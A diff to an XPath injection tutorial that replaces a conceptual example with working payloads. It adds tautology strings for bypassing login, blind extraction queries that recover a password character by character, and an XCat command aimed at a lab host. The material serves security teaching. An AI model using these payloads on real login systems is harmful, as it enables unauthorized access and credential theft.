@@ -45,26 +45,40 @@ A typical authentication XPath query has this form:
 You inject a quote into the username and check whether the query breaks (XPath error) or changes behavior: a sign
 that the input reaches the expression without escape.
 
-### Phase 2 - Authentication bypass (conceptual)
+### Phase 2 - Authentication bypass
 
-As in SQLi, you introduce an always-true condition (a tautology) that makes the password irrelevant. In minimal
-didactic form:
+As in SQLi, you introduce an always-true condition (a tautology) that makes the password irrelevant. Payloads in
+the username field:
 
 ```
-Username: ' or '1'='1          <-- tautology: the condition becomes always true
-# the unsanitized query returns the first user node -> authentication bypassed
+' or '1'='1              <-- classic tautology
+admin' or '1'='1         <-- forces the 'admin' user
+') or ('1'='1            <-- when the input is enclosed in parentheses
+' or position()=1 or '   <-- selects the first user node
 ```
 
 ### Phase 3 - Blind extraction of the entire document
 
-In the absence of access control, you navigate the XML document one node/character at a time using XPath
-functions (`substring()`, `string-length()`, `name()`) and the behavioral differences between true and false
-conditions.
-
-Illustrative output (representative, outcome of a test condition):
+In the absence of XPath access control, you navigate the entire XML one character at a time using `substring()`,
+`string-length()`, `count()`, `name()` and the true/false behavioral differences:
 
 ```
-string-length(//user[1]/password) > 8  -> TRUE   <-- the first user's password is longer than 8 characters
+# How many user nodes exist
+' or count(/users/user)=5 or '                        -> TRUE if there are 5 users
+# Length of the first user's password
+' or string-length(/users/user[1]/password)=12 or '   -> TRUE if length is 12
+# Character-by-character extraction
+' or substring(/users/user[1]/password,1,1)='P' or '   -> TRUE: 1st char = 'P'
+' or substring(/users/user[1]/password,2,1)='a' or '   -> TRUE: 2nd char = 'a'
+# Structure discovery (node/attribute names)
+' or name(/users/user[1]/*[1])='username' or '
+```
+
+Automation with `XCat` (full document dump via blind XPath):
+
+```bash
+xcat --method GET run "http://target.lab/login" username --true-string "Welcome" \
+  -- "/users/user[position()=1]"
 ```
 
 Tools like `XCat` automate the blind extraction of the entire XML.
